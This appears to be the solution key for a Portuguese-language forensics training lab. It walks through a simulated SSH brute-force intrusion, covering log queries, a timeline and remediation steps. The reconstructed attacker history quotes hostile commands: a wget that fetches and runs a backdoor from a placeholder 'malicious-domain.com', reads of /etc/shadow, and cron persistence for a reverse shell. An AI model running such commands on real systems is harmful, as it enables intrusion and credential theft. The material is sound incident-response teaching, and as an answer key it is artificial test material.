# FORENSICS LAB - SOLUTION

## RESPUESTAS ESPERADAS

### 1. QUANDO começou o ataque?

**Resposta esperada:** Aproximadamente 1 hora atrás (hora exata depende de quando você conectou)

**Como descobrir:**
```bash
$ sudo cat /var/log/auth.log | tail -50
```

Você verá linhas como:
```
Mar 14 19:30:15 server sshd[1234]: Invalid user attacker from 203.45.67.89 port 54321
Mar 14 19:30:20 server sshd[1235]: Failed password for invalid user attacker from 203.45.67.89
Mar 14 19:31:10 server sshd[2000]: Accepted password for ubuntu from 203.45.67.89 port 54330
```

**Indicador**: O login bem-sucedido ("Accepted password") marca o início do acesso

---

### 2. COMO o atacante entrou?

**Resposta esperada:** SSH Brute Force Attack

**Evidência:**
```
Multiple "Failed password" entries
One "Accepted password" entry
Origem: 203.45.67.89
```

**Por que foi possível?**
- Senha fraca do usuário `ubuntu`
- Sem rate limiting em SSH
- Sem 2FA/MFA

---

### 3. QUAL é o IP do atacante?

**Resposta esperada:** 203.45.67.89

**Como descobrir:**
```bash
$ grep "from 203" /var/log/auth.log
```

Todos os ataques viêm deste IP.

---

### 4. O QUE o atacante fez?

**Resposta esperada:** (ver ~/.bash_history)

**Sequência de ações:**
```
1. ls -la                          (Reconhecimento)
2. whoami                           (Descobrir usuário)
3. sudo su -                        (Tentar escalar para root)
4. cd /tmp                          (Ir para /tmp)
5. wget https://malicious-domain.com/backdoor.sh  (Download malware)
6. chmod +x backdoor.sh             (Tornar executável)
7. ./backdoor.sh                    (Executar backdoor)
8. mkdir .hidden                    (Criar diretório oculto)
9. mv backdoor.sh .hidden/monitor.sh (Mover para local oculto)
10. crontab -l                      (Ver cron do usuário)
11. crontab -e                      (Editar cron)
12. sudo crontab -l                 (Ver cron do root)
13. sudo crontab -e                 (Editar cron root)
14. cat /etc/passwd                 (Extrair usuários)
15. cat /etc/shadow                 (Tentar extrair hashes)
16. find / -type f -name "*.conf"   (Procurar arquivos de config)
17. ls -la /home/                   (Explorar diretórios)
18. ls -la /root/                   (Tentar acessar root)
19. cd /var/www                     (Procurar aplicação web)
20. cat config.php                  (Extrair credenciais)
21. exit                            (Desconectar)
```

---

### 5. QUAIS arquivos foram criados/modificados?

**Resposta esperada:**

```bash
$ find / -mmin -60 2>/dev/null
```

Você verá:
```
/tmp/.hidden/                       (Diretório criado)
/tmp/.hidden/monitor.sh             (Script backdoor)
/tmp/.system-check                  (Script reverse shell)
/tmp/update.py                      (Python backdoor)
/tmp/.dataexport                    (Lista de dados roubados)
/tmp/sudo_abuse                     (Sudo rule)
/var/spool/cron/crontabs/root      (Cron modificado)
/home/ubuntu/.bash_history          (Histórico modificado)
/root/.bash_history                 (Histórico root modificado)
```

---

### 6. O atacante ainda está lá?

**Resposta esperada:** SIM (backdoor instalado)

**Como descobrir:**
```bash
$ ps aux | grep monitor
$ ps aux | grep update.py
```

Ou verifique cron jobs:
```bash
$ sudo crontab -l
```

Você verá:
```
*/15 * * * * /tmp/.hidden/monitor.sh > /dev/null 2>&1
```

**Significado**: A cada 15 minutos, o backdoor tenta estabelecer conexão reversa

---

### 7. LINHA DO TEMPO COMPLETA

```
═══════════════════════════════════════════════════════════════

FORENSICS TIMELINE - GLOBOMANTICS INCIDENT

═══════════════════════════════════════════════════════════════

[19:30] ATTACK BEGINS
────────────────────────────────────────────────────────────
19:30:15 - First failed SSH attempt (Invalid user "attacker")
19:30:20 - Continued SSH brute force attempts
19:30:30 - More failed password attempts
          Attacker testing username "ubuntu"
19:31:00 - Brute force continues with different ports
19:31:10 - SUCCESSFUL LOGIN - Attacker gains access as ubuntu
          Source IP: 203.45.67.89
          Port: 54330
          Method: SSH password authentication

[19:31-19:35] RECONNAISSANCE PHASE
────────────────────────────────────────────────────────────
19:31:20 - Attacker checks: ls -la
19:31:30 - Attacker checks: whoami (confirms ubuntu user)
19:31:40 - Attacker attempts: sudo su - (privilege escalation)
19:32:00 - Attacker navigates to /tmp
19:32:10 - Attacker downloads backdoor script
          wget https://malicious-domain.com/backdoor.sh
19:32:30 - Attacker makes script executable: chmod +x
19:32:40 - Attacker executes backdoor: ./backdoor.sh
19:33:00 - Attacker creates hidden directory: mkdir .hidden
19:33:10 - Attacker moves backdoor to hidden location

[19:33-19:35] DATA EXFILTRATION PHASE
────────────────────────────────────────────────────────────
19:33:20 - Attacker extracts system users: cat /etc/passwd
19:33:30 - Attacker extracts password hashes: cat /etc/shadow
19:33:40 - Attacker searches for config files
          find / -type f -name "*.conf"
19:34:00 - Attacker explores /home and /root directories
19:34:20 - Attacker checks /var/www for web applications
19:34:40 - Attacker extracts database credentials: cat config.php

[19:34-19:35] PERSISTENCE PHASE
────────────────────────────────────────────────────────────
19:34:50 - Attacker views cron jobs: crontab -l
19:35:00 - Attacker edits cron: crontab -e
          Adds: */15 * * * * /tmp/.hidden/monitor.sh
19:35:10 - Attacker edits root cron: sudo crontab -e
          Adds same reverse shell mechanism
19:35:15 - Backdoor installed and will execute every 15 minutes

[19:35] ATTACK ENDS
────────────────────────────────────────────────────────────
19:35:30 - Attacker disconnects: exit
19:35:45 - But backdoor remains active in cron

[PRESENT] ONGOING THREAT
────────────────────────────────────────────────────────────
- Backdoor script still in /tmp/.hidden/monitor.sh
- Cron job executes every 15 minutes
- Attacker can reconnect via cron reverse shell
- Database credentials compromised
- System users and password hashes exposed
- Sensitive configuration files may have been copied

═══════════════════════════════════════════════════════════════
TOTAL ATTACK DURATION: ~5 minutes
SYSTEM COMPROMISED FOR: 1 hour (and counting)
BACKDOORS INSTALLED: YES (2 cron jobs)
RISK LEVEL: 🔴 CRITICAL
═══════════════════════════════════════════════════════════════
```

---

## RECOMENDAÇÕES IMEDIATAS

### 1. CONTAINMENT (Agora)
- [ ] Isolar servidor da rede
- [ ] Matar processos do atacante (se ainda rodando)
- [ ] Remover credenciais do banco de dados
- [ ] Notificar usuários sobre possível vazamento

### 2. REMOVAL (Próximas 2 horas)
- [ ] Remover arquivo `/tmp/.hidden/monitor.sh`
- [ ] Remover arquivo `/tmp/.system-check`
- [ ] Remover arquivo `/tmp/update.py`
- [ ] Remover cron jobs maliciosos
- [ ] Mudar senha do usuário ubuntu
- [ ] Mudar chaves SSH do root

### 3. RECOVERY (Próximas 24 horas)
- [ ] Restaurar servidor de backup clean
- [ ] Rotear todas as credenciais
- [ ] Ativar monitoring avançado
- [ ] Implementar rate limiting em SSH
- [ ] Implementar 2FA para SSH
- [ ] Atualizar sistema operacional

### 4. PREVENTION (Próximas 1-2 semanas)
- [ ] Implementar WAF
- [ ] Implementar IDS/IPS
- [ ] Configurar auditd
- [ ] Implementar SIEM
- [ ] Realizar security hardening
- [ ] Implementar compliance scanning

---

## CHECKLIST DE INVESTIGAÇÃO

- [x] Analisar logs de autenticação
- [x] Identificar primeiro acesso suspeito
- [x] Rastrear IP do atacante
- [x] Analisar histórico de comandos
- [x] Encontrar arquivos suspeitos
- [x] Verificar cron jobs
- [x] Identificar backdoors
- [x] Calcular impacto
- [x] Documentar timeline
- [x] Preservar evidências

---

**Investigação Completa!** 🎉
